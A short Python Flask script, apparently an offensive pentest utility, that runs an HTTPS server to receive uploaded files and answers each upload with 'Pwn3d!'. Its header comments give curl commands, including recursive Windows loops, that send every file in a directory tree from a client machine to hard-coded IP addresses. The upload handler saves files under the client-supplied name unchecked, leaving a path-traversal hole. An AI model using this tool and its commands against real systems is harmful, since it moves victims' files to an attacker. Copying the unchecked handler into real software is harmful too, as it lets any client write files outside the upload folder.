#!/usr/bin/env python3
#  @jockemedlinux 2023-05-09  #
from flask import Flask, request
import ssl
import os
import atexit
import argparse

# Retrieve a file from client:                      curl -F "file=@file-to-transfer.txt" https://10.50.45.73:8443/ -k
# Retrieve multiple files from client:              for %f in (*) do curl -F "file=@%f" https://10.77.0.35/ -k
# Retrieve all files in current dir and subdirs:    for /R %f in (*) do curl -F "file=@%f" https://10.77.0.35/ -k

parser = argparse.ArgumentParser()
parser.add_argument("-i", help="specify ip to listen on.")
parser.add_argument("-p", help="specify port to listen on.")
args = parser.parse_args()

# Generates disposable certificates in same folder as where script is run
command = os.system('openssl req -x509 -nodes -days 1 -keyout x.key -out x.crt -subj "/CN=Pwn3d" > /dev/null 2>&1')

def cleanup():
    os.remove('x.key')
    os.remove('x.crt')

app = Flask(__name__)
app.name = "[+] jml-filetransfer [+]"

@app.route('/', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(os.path.join(os.getcwd(), file.filename))
    return '\n[+] Pwn3d! [+]\n'

if __name__ == '__main__':
    if args.i and args.p:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain('x.crt', 'x.key')
        atexit.register(cleanup)
        app.run(ssl_context=context, host=args.i, port=args.p, debug=False)
    else:
        print("\nRunning in default mode. Listening on all interfaces.\n")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain('x.crt', 'x.key')
        atexit.register(cleanup)
        app.run(ssl_context=context, host='0.0.0.0', port=443, debug=False)